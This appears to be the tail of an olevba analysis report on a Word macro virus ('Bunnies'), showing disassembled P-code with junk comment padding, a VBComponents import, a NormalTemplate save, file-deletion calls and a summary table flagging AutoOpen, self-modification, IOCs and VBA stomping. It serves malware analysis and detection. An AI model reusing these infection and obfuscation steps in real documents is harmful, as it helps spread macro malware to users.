' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #1344:
' 	QuoteRem 0x0001 0x0007 "3323862"
' Line #1345:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1346:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1347:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1348:
' 	QuoteRem 0x0001 0x0007 "7637641"
' Line #1349:
' 	QuoteRem 0x0001 0x0007 "4698723"
' Line #1350:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1351:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1352:
' 	QuoteRem 0x0001 0x0007 "2443062"
' Line #1353:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1354:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1355:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1356:
' 	QuoteRem 0x0001 0x0007 "2057988"
' Line #1357:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1358:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1359:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1360:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1361:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1362:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1363:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1364:
' 	QuoteRem 0x0001 0x0007 "5646897"
' Line #1365:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1366:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1367:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1368:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1369:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1370:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1371:
' 	QuoteRem 0x0001 0x0007 "5950008"
' Line #1372:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1373:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1374:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1375:
' 	EndWith 
' Line #1376:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1377:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1378:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1379:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1380:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1381:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1382:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1383:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1384:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1385:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1386:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1387:
' 	QuoteRem 0x0001 0x0007 "3549341"
' Line #1388:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1389:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1390:
' 	QuoteRem 0x0001 0x0007 "4639101"
' Line #1391:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1392:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1393:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1394:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1395:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1396:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1397:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1398:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1399:
' 	QuoteRem 0x0001 0x0007 "8045723"
' Line #1400:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1401:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1402:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1403:
' 	QuoteRem 0x0001 0x0007 "4942211"
' Line #1404:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1405:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1406:
' 	QuoteRem 0x0001 0x0006 "738997"
' Line #1407:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #1408:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1409:
' 	QuoteRem 0x0001 0x0007 "2064494"
' Line #1410:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1411:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1412:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1413:
' 	QuoteRem 0x0001 0x0007 "6120195"
' Line #1414:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1415:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1416:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1417:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1418:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1419:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1420:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1421:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1422:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1423:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1424:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1425:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1426:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1427:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1428:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1429:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1430:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1431:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1432:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1433:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1434:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1435:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1436:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1437:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1438:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1439:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #1440:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1441:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1442:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1443:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1444:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1445:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1446:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1447:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1448:
' 	QuoteRem 0x0001 0x0007 "1255153"
' Line #1449:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1450:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1451:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1452:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1453:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1454:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1455:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1456:
' 	QuoteRem 0x0001 0x0007 "8723070"
' Line #1457:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1458:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1459:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1460:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1461:
' 	QuoteRem 0x0001 0x0007 "9663826"
' Line #1462:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1463:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1464:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1465:
' 	QuoteRem 0x0001 0x0007 "2322572"
' Line #1466:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1467:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1468:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1469:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1470:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1471:
' 	LitStr 0x000B "Bunnies!!!!"
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #1472:
' 	QuoteRem 0x0001 0x0007 "7457195"
' Line #1473:
' 	QuoteRem 0x0001 0x0007 "5604039"
' Line #1474:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1475:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1476:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1477:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1478:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1479:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1480:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1481:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1482:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1483:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1484:
' 	QuoteRem 0x0001 0x0007 "9993030"
' Line #1485:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1486:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1487:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1488:
' 	QuoteRem 0x0001 0x0007 "1258906"
' Line #1489:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1490:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1491:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1492:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1493:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1494:
' 	QuoteRem 0x0001 0x0007 "6322403"
' Line #1495:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1496:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1497:
' 	QuoteRem 0x0001 0x0006 "282463"
' Line #1498:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1499:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1500:
' 	QuoteRem 0x0001 0x0007 "8337996"
' Line #1501:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1502:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1503:
' 	LitStr 0x001D "C:\Windows\System\Bunnies.cpl"
' 	ArgsCall Kill 0x0001 
' Line #1504:
' 	QuoteRem 0x0001 0x0007 "4667369"
' Line #1505:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1506:
' 	QuoteRem 0x0001 0x0007 "7199118"
' Line #1507:
' 	QuoteRem 0x0001 0x0007 "6027973"
' Line #1508:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1509:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1510:
' 	QuoteRem 0x0001 0x0007 "5417087"
' Line #1511:
' 	QuoteRem 0x0001 0x0007 "6648766"
' Line #1512:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1513:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1514:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1515:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1516:
' 	QuoteRem 0x0001 0x0006 "480586"
' Line #1517:
' 	QuoteRem 0x0001 0x0007 "6480753"
' Line #1518:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1519:
' 	QuoteRem 0x0001 0x0007 "5110557"
' Line #1520:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1521:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1522:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1523:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1524:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1525:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1526:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1527:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1528:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1529:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1530:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1531:
' 	QuoteRem 0x0001 0x0007 "1091471"
' Line #1532:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1533:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1534:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1535:
' 	LitStr 0x0017 "C:\Windows\System\B.cpl"
' 	ArgsCall Kill 0x0001 
' Line #1536:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1537:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1538:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1539:
' 	QuoteRem 0x0001 0x0006 "448319"
' Line #1540:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1541:
' 	QuoteRem 0x0001 0x0007 "6095679"
' Line #1542:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1543:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1544:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1545:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1546:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1547:
' 	QuoteRem 0x0001 0x0007 "3107064"
' Line #1548:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1549:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1550:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1551:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1552:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1553:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1554:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1555:
' 	QuoteRem 0x0001 0x0007 "7035769"
' Line #1556:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1557:
' 	QuoteRem 0x0001 0x0007 "2687216"
' Line #1558:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1559:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1560:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1561:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1562:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1563:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1564:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1565:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1566:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1567:
' 	EndFunc 
' Line #1568:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1569:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1570:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1571:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1572:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1573:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1574:
' 	QuoteRem 0x0001 0x0007 "6965555"
' Line #1575:
' 	QuoteRem 0x0001 0x0006 "319395"
' Line #1576:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1577:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1578:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1579:
' 	QuoteRem 0x0001 0x0006 "575315"
' Line #1580:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1581:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1582:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1583:
' 	QuoteRem 0x0001 0x0007 "9915977"
' Line #1584:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1585:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1586:
' 	QuoteRem 0x0001 0x0007 "8231429"
' Line #1587:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1588:
' 	QuoteRem 0x0001 0x0006 "509187"
' Line #1589:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1590:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1591:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1592:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1593:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1594:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1595:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1596:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1597:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1598:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1599:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #1600:
' 	QuoteRem 0x0001 0x0001 "T"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |b.cpl               |Executable file name                         |
|IOC       |bunnies.cpl         |Executable file name                         |
|IOC       |Bunnies.cpl         |Executable file name                         |
|IOC       |B.cpl               |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

